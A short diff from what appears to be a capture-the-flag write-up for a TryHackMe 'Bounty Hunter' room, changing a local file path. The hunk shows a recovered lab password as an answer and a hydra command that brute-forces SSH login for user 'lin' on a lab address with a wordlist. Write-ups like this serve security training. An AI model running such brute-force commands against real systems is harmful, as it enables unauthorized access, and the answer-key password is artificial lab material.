@@ -88,7 +88,7 @@ Q. What is the users password?
 A. RedDr4gonSynd1cat3
 
 ```bash
-hydra -l lin -P /home/pointnext/Documents/THM/Bounty_hunter/locks.txt ssh://10.10.14.22
+hydra -l lin -P /home/username/Documents/THM/Bounty_hunter/locks.txt ssh://10.10.14.22
 ```
 
 Q. user.txt
